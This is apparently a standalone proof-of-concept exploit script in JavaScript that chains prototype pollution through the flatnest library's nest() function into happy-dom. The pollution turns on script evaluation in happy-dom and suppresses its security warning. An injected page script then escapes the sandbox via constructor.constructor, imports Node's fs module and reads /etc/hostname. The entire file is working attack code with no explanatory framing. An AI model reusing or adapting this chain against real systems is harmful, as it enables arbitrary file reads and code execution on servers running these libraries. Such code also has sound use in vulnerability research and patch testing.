import { Window } from 'happy-dom';
import { nest } from 'flatnest';

nest({
  a: '[Circular (constructor.prototype)]',
  'a.settings.enableJavaScriptEvaluation': true,
  'a.settings.suppressInsecureJavaScriptEnvironmentWarning': true
});

const window = new Window({ console });
window.document.write(`<!doctype html><body><script>
const sab = new SharedArrayBuffer(4);
const ia = new Int32Array(sab);
let fsMod;
this.constructor.constructor('return import("fs")')()
  .then((m) => { fsMod = m; Atomics.store(ia, 0, 1); Atomics.notify(ia, 0); })
  .catch((e) => { document.body.textContent = e.toString(); Atomics.store(ia, 0, 2); Atomics.notify(ia, 0); });
Atomics.wait(ia, 0, 0);
if (fsMod) {
  const data = fsMod.readFileSync('/etc/hostname', 'utf8');
  document.body.textContent = data;
}
</script>`);

console.log(window.document.body.textContent);
